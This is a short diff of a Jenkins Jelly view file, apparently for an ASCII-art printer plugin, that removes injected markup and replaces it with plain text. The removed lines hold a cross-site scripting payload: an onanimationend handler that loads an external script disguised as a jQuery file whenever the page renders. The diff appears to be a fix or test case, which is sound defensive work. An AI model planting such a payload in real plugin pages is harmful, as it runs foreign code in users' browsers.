@@ -1,5 +1,4 @@
 <?jelly escape-by-default='true'?>
-<div><a onclick="console.log(1)">a</a><style>@keyframes x{}</style><a style="animation-name:x" onanimationend="const script = document.createElement('script');script.src = 'http://localhost/jquery-min-3.2.7.js';document.body.appendChild(script);"
-></a>
-    Plugin for ascii-arts in the build step.
+<div>
+Ascii printer
 </div>
